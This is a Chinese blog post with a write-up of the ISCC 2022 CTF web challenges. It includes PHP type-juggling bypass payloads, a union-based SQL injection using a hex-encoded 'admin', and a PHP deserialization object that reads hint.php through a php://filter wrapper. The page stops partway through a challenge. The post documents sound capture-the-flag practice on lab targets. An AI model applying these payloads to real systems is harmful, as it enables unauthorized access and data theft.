<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wp.zgroot.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="StartISCC居然从头到尾有一个零解（">
<meta property="og:type" content="article">
<meta property="og:title" content="ISCC 2022 CTF">
<meta property="og:url" content="https://wp.zgroot.cn/ISCC/ISCC_2022/index.html">
<meta property="og:site_name" content="楼上请让路*的WP">
<meta property="og:description" content="StartISCC居然从头到尾有一个零解（">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518165416498.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518184331689.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518205949672.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518210629313.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518210543869.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518211322294.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518213817064.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518214135491.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518214417226.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518214029540.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518214605462.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518215644798.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518215509119.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518220043951.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518221330323.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518221353598.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518221515614.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518221900144.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518222126997.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220521233627739.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220521233714398.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522125410541.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522125458491.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522130241623.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522130326809.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518223308258.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518223400947.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220518223455599.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522135511140.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522133628262.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522135725416.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519184605368.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523205055522.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523205300413.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185034297.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185208759.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185357852.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185443800.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185636137.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185748503.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519185908858.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519190015979.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519190301822.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519190418219.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519190640762.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519191710066.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220522121348107.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519193131337.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519193452690.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519194750167.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519194940717.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519195143847.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519195257456.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201028835.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201351415.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201441954.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201632921.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201705336.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201734279.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519201938545.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519203527616.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519204032239.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519204241873.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519204619091.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519204650069.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519204750682.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523142654587.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523142732502.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523142757057.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523215612112.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220523215535188.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519205104722.png">
<meta property="og:image" content="https://wp.zgroot.cn/upload/img/image-20220519205246095.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220502161408233.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220502150019723.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220502100753717.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220502135454579.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC_2022_pwn.assets/image-20220511141855121.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220502203014478.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220502203303941.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC_2022_pwn.assets/image-20220502150925505.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC_2022_pwn.assets/image-20220531215015771.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC/ISCC_2022/ISCC_2022_pwn.assets/image-20220531215332239.png">
<meta property="og:image" content="https://wp.zgroot.cn/ISCC_2022_pwn.assets/image-20220531231430009.png">
<meta property="article:published_time" content="2022-05-25T06:46:25.000Z">
<meta property="article:modified_time" content="2022-06-28T17:03:10.863Z">
<meta property="article:author" content="楼上请让路*">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Misc">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wp.zgroot.cn/upload/img/image-20220518165416498.png">

<link rel="canonical" href="https://wp.zgroot.cn/ISCC/ISCC_2022/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>ISCC 2022 CTF | 楼上请让路*的WP</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">楼上请让路*的WP</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">wp发布</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>链接</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wp.zgroot.cn/ISCC/ISCC_2022/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/image.png">
      <meta itemprop="name" content="楼上请让路*">
      <meta itemprop="description" content="楼上请让路*的WP">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="楼上请让路*的WP">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ISCC 2022 CTF
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-05-25 14:46:25 14:46:25" itemprop="dateCreated datePublished" datetime="2022-05-25T14:46:25+08:00">2022-05-25 14:46:25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-06-29 01:03:10 01:03:10" itemprop="dateModified" datetime="2022-06-29T01:03:10+08:00">2022-06-29 01:03:10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/ISCC/" itemprop="url" rel="index"><span itemprop="name">ISCC</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h2 id="Start"><a href="#Start" class="headerlink" title="Start"></a>Start</h2><p>ISCC居然从头到尾有一个零解（</p>
<span id="more"></span>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="冬奥会"><a href="#冬奥会" class="headerlink" title="冬奥会"></a>冬奥会</h3><p>这个题就是一个简单的代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Step1</span>=False;</span><br><span class="line"><span class="variable">$Step2</span>=False;</span><br><span class="line"></span><br><span class="line"><span class="variable">$info</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;Information&#x27;</span>]);<span class="comment">//接受get的传参的json格式，转换为数组格式</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$info</span>))&#123;<span class="comment">//判断是不是数组格式</span></span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$info</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;<span class="comment">//检查year是不是数字或者数字字符串，是则结束</span></span><br><span class="line">    <span class="keyword">if</span>(@<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>])&#123;</span><br><span class="line">        (<span class="variable">$info</span>[<span class="string">&quot;year&quot;</span>]=<span class="number">2022</span>)?<span class="variable">$Step1</span>=True:<span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_array</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>][<span class="number">1</span>])OR <span class="title function_ invoke__">count</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>])!==<span class="number">3</span> ) <span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>);<span class="comment">//判断items是一个3个量的数组且第二个值的类型是一个数组</span></span><br><span class="line">        <span class="variable">$status</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;skiing&quot;</span>, <span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>]);</span><br><span class="line">        <span class="variable">$status</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;<span class="comment">//判断数组中是否有skiing这个字符串，没有则结束</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$info</span>[<span class="string">&quot;items&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;skiing&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;Sorry~&quot;</span>):<span class="literal">NULL</span>;<span class="comment">//判断数组中是否有skiing这个字符串，有则结束</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$Step2</span>=True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Step1</span> &amp;&amp; <span class="variable">$Step2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;2022flag.php&quot;</span>;<span class="keyword">echo</span> <span class="variable">$flag</span>;<span class="comment">//文件包含打印flag</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>要注意的点我写在代码的注释中了，首先传入格式是json，有个变量为year值不能是数字或者数字字符串，有个数组iteam，然后要对数组第二个进行判断不是数组为3个值则进入if条件句满足两个条件跳过if语句，接着用array_seach判断数组中是否有skiing没有则退出，然后又用foreach判断有则退出，这里判断原理是弱等于，用0就可以绕过所以最终payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?Information=&#123;&quot;year&quot;:&quot;a&quot;,&quot;items&quot;:[0,[],2]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/upload/img/image-20220518165416498.png" alt="image-20220518165416498"></p>
<h3 id="爱国敬业好青年-2"><a href="#爱国敬业好青年-2" class="headerlink" title="爱国敬业好青年-2"></a>爱国敬业好青年-2</h3><p><img src="/upload/img/image-20220518184331689.png" alt="image-20220518184331689"></p>
<p>页面就是一个请找到爱国敬业好青年所处的城市（前一个题一直零解，，前一个题一直零解，我只想把出题人关小黑屋抄100，，不200遍社会主义核心价值观），通过前一个题</p>
<p><img src="/upload/img/image-20220518205949672.png" alt="image-20220518205949672"></p>
<p>可以判断应该是北京天安门的坐标，输入了他给了个假的flag，我还去试了半天（哭晕在厕所）输什么他都会给这个假的flag</p>
<p><img src="/upload/img/image-20220518210629313.png" alt="image-20220518210629313"></p>
<p>Ctrl+u看源码</p>
<p><img src="/upload/img/image-20220518210543869.png" alt="image-20220518210543869"></p>
<p>有个info路由，进去是刚刚那个假的flag，往上看form标签，有个action规定当提交表单时向flag发送表单数据，method规定了以post提交，用hackbar提交数据</p>
<p><img src="/upload/img/image-20220518211322294.png" alt="image-20220518211322294"></p>
<h3 id="Pop2022"><a href="#Pop2022" class="headerlink" title="Pop2022"></a>Pop2022</h3><p>这个题当时是非预期解做的，直接访问flag.php得到flag，应该是文件没删，后来被修改了</p>
<h3 id="Easy-SQL"><a href="#Easy-SQL" class="headerlink" title="Easy-SQL"></a>Easy-SQL</h3><p>看题目是一个sql的题</p>
<p><img src="/upload/img/image-20220518213817064.png" alt="image-20220518213817064"></p>
<p>提示我们找数据库名？尝试用id</p>
<p><img src="/upload/img/image-20220518214135491.png" alt="image-20220518214135491"></p>
<p>这个回显怎么说，像是sql-labs靶场，先用sqlmap扫描一下</p>
<p><img src="/upload/img/image-20220518214417226.png" alt="image-20220518214417226"></p>
<p>只能知道数据库是securitymysql数据库版本是8</p>
<p><img src="/upload/img/image-20220518214029540.png" alt="image-20220518214029540"></p>
<p>这个地方的flag是假的，id等于8的时候</p>
<p><img src="/upload/img/image-20220518214605462.png" alt="image-20220518214605462"></p>
<p>看到提示让猜邮箱，security数据库中有一个emails的表，mysql8.0开始新版的特性可以使用table user替换select * from，这里用联合查询且用limit去截取emails表中的数据，截取到第7个的时候发现一个压缩包，先下载下来看看</p>
<p><img src="/upload/img/image-20220518215644798.png" alt="image-20220518215644798"></p>
<p>打开下载的文件</p>
<p><img src="/upload/img/image-20220518215509119.png" alt="image-20220518215509119"></p>
<p>这里可以看到还可以用post传入数据带入sql语句</p>
<p><img src="/upload/img/image-20220518220043951.png" alt="image-20220518220043951"></p>
<p>且这里只对passwd进行了严格的过滤，我们可以在username这个地方插入语句用单引号闭合前面的引号，对username判断是不是等于admin，对username转化的数组的passwd部分与passwd比较，这里先判断几个字段，这个题的源码越审越感觉见过</p>
<p><img src="/upload/img/image-20220518221330323.png" alt="image-20220518221330323"></p>
<p><img src="/upload/img/image-20220518221353598.png" alt="image-20220518221353598"></p>
<p>4个字段没反应，3个字段正常回显，这里可以判断是3个字段</p>
<p><img src="/upload/img/image-20220518221515614.png" alt="image-20220518221515614"></p>
<p>这里经测试是第三个字段为密码，又提示说错误的user，尝试用admin去替换1，2</p>
<p><img src="/upload/img/image-20220518221900144.png" alt="image-20220518221900144"></p>
<p>都没反应？这是过滤了？admin出现就没反应了，尝试用16进制绕过</p>
<p>username&#x3D;1’ union select 1,0x61646d696e,3#&amp;passwd&#x3D;3</p>
<p><img src="/upload/img/image-20220518222126997.png" alt="image-20220518222126997"></p>
<h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>这个题打开就一张图片</p>
<p><img src="/upload/img/image-20220521233627739.png" alt="image-20220521233627739"></p>
<p>看源码发现注释了有一个文件</p>
<p><img src="/upload/img/image-20220521233714398.png" alt="image-20220521233714398"></p>
<p>打开这个文件，看到是一个php的代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un3</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un4</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//魔术方法，当类被实例化时自动调用</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;un0) &amp;&amp; <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;un2))&#123;<span class="comment">//当变量un0存在，un2不存在时进入if条件句</span></span><br><span class="line">            <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">Givemeanew</span>();<span class="comment">//调用Givemeanew方法</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span> -&gt; un3 === <span class="string">&#x27;unserialize&#x27;</span>)&#123;<span class="comment">//当un3等于unserialize进入if条件句</span></span><br><span class="line">                <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">yigei</span>();<span class="comment">//调用yigei函数</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span> -&gt; <span class="title function_ invoke__">giao</span>();<span class="comment">// 调用giao函数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Givemeanew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; un4 = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">un0</span>(<span class="variable">$this</span> -&gt; un1);<span class="comment">//将un0的参数实例化赋值给un4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">yigei</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your output: &#x27;</span>.<span class="variable language_">$this</span>-&gt;un4;<span class="comment">//打印un4的值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">giao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;un2);<span class="comment">//代码执行函数</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable language_">$this</span> -&gt; un2.<span class="string">&#x27;hint.php&#x27;</span>;<span class="comment">//文件包含函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<p>发现有一个hint文件，先用伪协议去读这个文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$un2</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable language_">$this</span> -&gt; un2.<span class="string">&#x27;hint.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;a&quot;:1:&#123;s:3:&quot;un2&quot;;s:49:&quot;php://filter/read=convert.base64-encode/resource=&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/upload/img/image-20220522125410541.png" alt="image-20220522125410541"></p>
<p>解密读内容</p>
<p><img src="/upload/img/image-20220522125458491.png" alt="image-20220522125458491"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;flag在当前目录下以字母f开头的txt中,无法爆破出来&#x27;</span>;</span><br><span class="line">想办法读当前目录，想到用原生类</span><br></pre></td></tr></table></figure>

